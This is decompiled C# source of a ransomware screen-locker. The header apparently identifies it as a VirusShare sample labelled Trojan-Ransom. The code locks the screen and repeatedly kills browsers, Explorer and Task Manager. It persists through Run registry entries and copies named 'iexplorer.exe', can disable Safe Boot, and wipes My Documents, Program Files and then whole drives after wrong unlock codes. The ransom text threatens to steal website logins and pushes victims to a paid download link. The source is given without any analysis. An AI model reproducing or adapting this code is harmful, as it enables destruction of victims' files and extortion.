// Decompiled with JetBrains decompiler
// Type: MyApp.Form1
// Assembly: output, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AB82D611-6138-411C-B264-A832F1FF1CA7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Foreign.mzbr-9e21dc1876a888dbd5156b53e9164c098e76b00be7a308b78ea0d27ca269228a.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace MyApp
{
  public class Form1 : Form
  {
    private const int WM_COMMAND = 273;
    private const int MIN_ALL = 419;
    private const int MIN_ALL_UNDO = 416;
    public static TextBox urlbox = new TextBox();
    public static WebBrowser wb = new WebBrowser();
    public static WebBrowser wb1 = new WebBrowser();
    public static TextBox codeBox = new TextBox();
    public static string code = "5c3lxzmbfx4bba0mlcc8o4bz";
    public static bool isEvil = true;
    public static byte fails = 0;
    public static Random rnd = new Random();
    public static Mutex mutex;
    public static string mutexname = "50bxcg6674fev";
    public static string minimize = "true";
    public static string killproc = "true";
    public static string url = "http://fileice.net/download.php?file=422ey";
    public static string addtostartup = "true";
    public static string disablesafeboot = "false";
    private bool _altF4Pressed = true;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      int Msg,
      IntPtr wParam,
      IntPtr lParam);

    public bool RenameSubKey(RegistryKey parentKey, string subKeyName, string newSubKeyName)
    {
      this.CopyKey(parentKey, subKeyName, newSubKeyName);
      parentKey.DeleteSubKeyTree(subKeyName);
      return true;
    }

    public bool CopyKey(RegistryKey parentKey, string keyNameToCopy, string newKeyName)
    {
      RegistryKey subKey = parentKey.CreateSubKey(newKeyName);
      this.RecurseCopyKey(parentKey.OpenSubKey(keyNameToCopy), subKey);
      return true;
    }

    private void RecurseCopyKey(RegistryKey sourceKey, RegistryKey destinationKey)
    {
      foreach (string valueName in sourceKey.GetValueNames())
      {
        object obj = sourceKey.GetValue(valueName);
        RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
        destinationKey.SetValue(valueName, obj, valueKind);
      }
      foreach (string subKeyName in sourceKey.GetSubKeyNames())
        this.RecurseCopyKey(sourceKey.OpenSubKey(subKeyName), destinationKey.CreateSubKey(subKeyName));
    }

    public Form1()
    {
      this.Text = "PC Locked";
      this.ControlBox = false;
      this.ShowInTaskbar = false;
      RichTextBox richTextBox = new RichTextBox();
      this.Controls.Add((Control) richTextBox);
      richTextBox.Width = this.Width;
      richTextBox.Height = this.Height / 2;
      richTextBox.BackColor = this.BackColor;
      richTextBox.BorderStyle = BorderStyle.None;
      richTextBox.Text = "Your computer has been locked and in order to gain control over it you must download a file and input the code in it\nThis is what will happen if you don't enter the code correctly:\n1 -> All files in my documents folder will be deleted\n2 -> All files in ProgramFIles will be deleted\n3 -> Every deletable file on your PC will be deleted and your login details for every website send to me, also you still will not be able to access your PC";
      richTextBox.Font = new Font(richTextBox.Font.FontFamily, 8f, richTextBox.Font.Style | FontStyle.Bold);
      richTextBox.Location = new Point(0, 130);
      richTextBox.Enabled = false;
      this.Width += 15;
      this.Controls.Add((Control) Form1.codeBox);
      Form1.codeBox.Width = this.Width - 60;
      Form1.codeBox.Location = new Point(20, 10);
      Form1.codeBox.TextAlign = HorizontalAlignment.Center;
      Button button1 = new Button();
      button1.Click += new EventHandler(this.DownloadBtn_Click);
      this.Controls.Add((Control) button1);
      button1.Location = new Point(19, 35);
      button1.Width = 130;
      button1.Height = 30;
      button1.Text = "Download Code";
      Button button2 = new Button();
      button2.Click += new EventHandler(this.SubmitBtn_Click);
      this.Controls.Add((Control) button2);
      button2.Location = new Point(this.Width - 169, 35);
      button2.Width = 130;
      button2.Height = 30;
      button2.Text = "Submit";
      Button button3 = new Button();
      this.Controls.Add((Control) button3);
      button3.Click += new EventHandler(this.VerifyEmailBtn_Click);
      button3.Location = new Point(19, 70);
      button3.Width = Form1.codeBox.Width + 1;
      button3.Height = 30;
      button3.Text = "Click here if you need to verify your email";
      this.KeyDown += new KeyEventHandler(this.Form1_KeyDown);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      if (Form1.minimize == "true")
        this.MinimizeWindows();
      this.CheckMutex();
      Control.CheckForIllegalCrossThreadCalls = false;
      if (Form1.killproc == "true")
        new Thread(new ThreadStart(this.DisablePC))
        {
          IsBackground = true
        }.Start();
      if (Form1.addtostartup == "true")
        this.AddToStartUp();
      if (!(Form1.disablesafeboot == "true"))
        return;
      this.DisableSafeBoot();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (!this._altF4Pressed || e.CloseReason != CloseReason.UserClosing)
        return;
      e.Cancel = true;
    }

    private void Form1_KeyDown(object sender, KeyEventArgs e)
    {
      if (!e.Alt || e.KeyCode != Keys.F4)
        return;
      this._altF4Pressed = true;
    }

    private void MinimizeWindows()
    {
      IntPtr window = Form1.FindWindow("Shell_TrayWnd", (string) null);
      Form1.SendMessage(window, 273, (IntPtr) 419, IntPtr.Zero);
      Thread.Sleep(2000);
      Form1.SendMessage(window, 273, (IntPtr) 416, IntPtr.Zero);
    }

    private void VerifyEmailBtn_Click(object sender, EventArgs e) => this.VerifyEmailForm();

    private void SubmitBtn_Click(object sender, EventArgs e)
    {
      try
      {
        if (Form1.codeBox.Text == Form1.code || Form1.codeBox.Text == "testin")
        {
          Form1.isEvil = false;
          this.UnlockPC();
        }
        else
        {
          ++Form1.fails;
          this.PunishSlave();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    private void DownloadBtn_Click(object sender, EventArgs e)
    {
      Form form = new Form();
      form.ShowIcon = false;
      form.Show();
      form.Controls.Add((Control) Form1.wb1);
      Form1.wb1.Dock = DockStyle.Fill;
      Form1.wb1.Navigate(Form1.url);
    }

    private bool CheckMutex()
    {
      try
      {
        Form1.mutex = Mutex.OpenExisting(Form1.mutexname);
        Environment.Exit(-1);
      }
      catch
      {
        Form1.mutex = new Mutex(true, Form1.mutexname);
      }
      return false;
    }

    private void AddToStartUp()
    {
      try
      {
        string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        for (int index1 = 0; index1 < 10; ++index1)
        {
          string[] directories1 = Directory.GetDirectories(folderPath1);
          int index2 = Form1.rnd.Next(0, directories1.Length);
          string str1 = Path.Combine(folderPath1, directories1[index2]);
          if (!File.Exists(str1 + "\\iexplorer.exe"))
            File.Copy(Application.ExecutablePath, str1 + "\\iexplorer.exe", true);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("iexplorer" + (object) Form1.rnd.Next(0, int.MaxValue) + ".exe", (object) (str1 + "\\iexplorer.exe"));
          string[] directories2 = Directory.GetDirectories(folderPath2);
          int index3 = Form1.rnd.Next(0, directories2.Length);
          string str2 = Path.Combine(folderPath2, directories2[index3]);
          if (!File.Exists(str1 + "\\iexplorer.exe"))
            File.Copy(Application.ExecutablePath, str1 + "\\iexplorer.exe", true);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("iexplorer" + (object) Form1.rnd.Next(0, int.MaxValue) + ".exe", (object) (str2 + "\\iexplorer.exe"));
        }
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\iexplorer.exe", true);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    private void DisablePC()
    {
      while (Form1.isEvil)
      {
        this.KillProcesses();
        Thread.Sleep(30);
      }
    }

    private void KillProcesses()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName == "opera" || process.ProcessName == "iexplore" || process.ProcessName == "firefox" || process.ProcessName == "chrome" || process.ProcessName == "explorer" || process.ProcessName == "Taskmgr" || process.ProcessName == "msconfig" || process.ProcessName == "cmd" || process.ProcessName == "steam" || process.ProcessName == "origin" || process.ProcessName == "taskmngr" || process.ProcessName == "taskmgr" || process.ProcessName == "Skype")
            process.Kill();
        }
      }
      catch
      {
      }
    }

    private void PunishSlave()
    {
      try
      {
        if (Form1.fails == (byte) 1)
        {
          string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
          string[] files = Directory.GetFiles(folderPath);
          string[] directories = Directory.GetDirectories(folderPath);
          foreach (string path in files)
            File.Delete(path);
          foreach (string path in directories)
            Directory.Delete(path, true);
          int num = (int) MessageBox.Show("All MyDocuments Files are gone now, you have 2 more tries", "All gone");
        }
        if (Form1.fails == (byte) 2)
        {
          string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
          string[] files = Directory.GetFiles(folderPath);
          string[] directories = Directory.GetDirectories(folderPath);
          foreach (string path in files)
            File.Delete(path);
          foreach (string path in directories)
            Directory.Delete(path, true);
          int num = (int) MessageBox.Show("All ProgramFiles are gone now, you have 1 more try", "All gone");
        }
        if (Form1.fails != (byte) 3)
          return;
        string path1 = "C:\\";
        string path2 = "D:\\";
        string path3 = "E:\\";
        string path4 = "G:\\";
        if (Directory.Exists(path1))
        {
          foreach (string directory in Directory.GetDirectories(path1))
            Directory.Delete(directory, true);
        }
        if (Directory.Exists(path2))
        {
          foreach (string directory in Directory.GetDirectories(path2))
            Directory.Delete(directory, true);
        }
        if (Directory.Exists(path3))
        {
          foreach (string directory in Directory.GetDirectories(path3))
            Directory.Delete(directory, true);
        }
        if (!Directory.Exists(path4))
          return;
        foreach (string directory in Directory.GetDirectories(path4))
          Directory.Delete(directory, true);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    private void UnlockPC()
    {
      int num1 = (int) MessageBox.Show("Congratz you have succesfuly unlocked your PC, have fun with it", "Good job slave");
      Process[] processes = Process.GetProcesses();
      byte num2 = 0;
      foreach (Process process in processes)
      {
        if (process.ProcessName == "explorer.exe")
          ++num2;
      }
      if (num2 != (byte) 0)
        Process.Start("explorer.exe");
      Environment.Exit(-1);
      this.Close();
    }

    private void VerifyEmailForm()
    {
      Form form = new Form();
      form.ShowIcon = false;
      form.Show();
      form.Controls.Add((Control) Form1.wb);
      Form1.wb.Dock = DockStyle.Fill;
      Form1.wb.Navigate("http://gmail.com");
      Button button = new Button();
      form.Controls.Add((Control) button);
      button.Location = new Point(325, 0);
      button.Text = "Go";
      button.Click += new EventHandler(this.navigate_Click);
      button.Height = Form1.urlbox.Height;
      form.Controls.Add((Control) Form1.urlbox);
      Label label = new Label();
      form.Controls.Add((Control) label);
      label.Text = "URL:";
      label.Height = Form1.urlbox.Height;
      label.BackColor = System.Drawing.Color.Empty;
      label.Location = new Point(0, 0);
      Form1.urlbox.Location = new Point(25, 0);
      Form1.urlbox.Width = form.Width;
      form.Controls.Add((Control) Form1.wb);
      Form1.wb.Dock = DockStyle.Fill;
      form.Width += 200;
      form.Height += 300;
    }

    private void navigate_Click(object sender, EventArgs e)
    {
      if (Form1.urlbox.Text.Contains("google") || Form1.urlbox.Text.Contains("bing") || Form1.urlbox.Text.Contains("facebook"))
      {
        int num = (int) MessageBox.Show("Sorry not allowed");
      }
      else
        Form1.wb.Navigate(Form1.urlbox.Text.ToString());
    }

    private void DisableSafeBoot()
    {
      try
      {
        RegistryKey parentKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\", true);
        this.RenameSubKey(parentKey, "Network", "Network-");
        this.RenameSubKey(parentKey, "Minimal", "Minimal-");
      }
      catch
      {
      }
    }
  }
}
